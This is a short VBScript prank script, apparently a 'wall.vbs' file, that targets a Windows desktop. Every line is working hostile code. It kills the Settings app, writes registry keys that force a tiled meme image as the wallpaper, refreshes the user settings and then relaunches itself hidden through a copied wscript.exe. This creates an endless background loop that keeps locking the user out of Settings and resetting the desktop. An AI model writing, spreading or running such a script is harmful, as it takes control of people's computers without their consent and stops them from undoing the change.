set s=CreateObject("Wscript.Shell")
w=CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
s.Run "taskkill /f /im SystemSettings.exe", 0, True
s.RegWrite "HKCU\Control Panel\Desktop\WallPaper",w+"\papaj.png","REG_SZ"
s.RegWrite "HKCU\Control Panel\Desktop\TileWallpaper",1,"REG_SZ"
s.Run "cmd /c RUNDLL32.EXE user32.dll UpdatePerUserSystemParameters", 0, True
Wscript.Sleep 100
s.Run w+"\wscript.exe "+w+"\wall.vbs", 0, False